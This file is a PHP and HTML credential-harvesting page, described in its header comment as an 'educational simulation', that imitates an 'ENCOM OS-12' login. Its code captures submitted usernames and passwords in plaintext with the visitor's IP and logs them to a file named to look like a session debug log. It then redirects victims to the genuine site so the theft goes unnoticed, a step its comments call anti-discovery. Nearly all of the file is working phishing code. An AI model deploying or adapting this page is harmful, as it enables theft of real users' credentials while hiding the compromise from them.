<?php
// Educational Simulation: Credential Harvester Logic

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture user inputs in plaintext
    $captured_user = $_POST['username'] ?? 'unknown';
    $captured_pass = $_POST['password'] ?? 'unknown';
    
    // Format the stolen credentials
    $log_entry = sprintf(
        "[%s] [HARVEST CAPTURE] USER: %s | PASS: %s | IP: %s\n",
        date("Y-m-d H:i:s"),
        $captured_user,
        $captured_pass,
        $_SERVER['REMOTE_ADDR']
    );
    
    // Write the credentials to a local file (Simulating the compromise file)
    // In your runbook, this mirrors the 'encom_session_debug.txt' file behavior
    file_put_contents("encom_session_debug.txt", $log_entry, FILE_APPEND);
    
    // Anti-Discovery Redirect: Send the user to the real, legitimate site.
    // The victim assumes they just mistyped their password the first time.
    header("Location: http://10.1.1");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ENCOM OS-12 Login</title>
    <style>
        body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; }
        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; }
        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Grid Node Authentication</h2>
    <!-- Spoofed form submission pointing directly back to the harvester script -->
    <form action="fake_login.php" method="POST">
        <label>Username:</label>
        <input type="text" name="username" required autocomplete="off">
        
        <label>Password:</label>
        <input type="password" name="password" required>
        
        <input type="submit" value="ESTABLISH HANDSHAKE">
    </form>
</div>

</body>
</html>
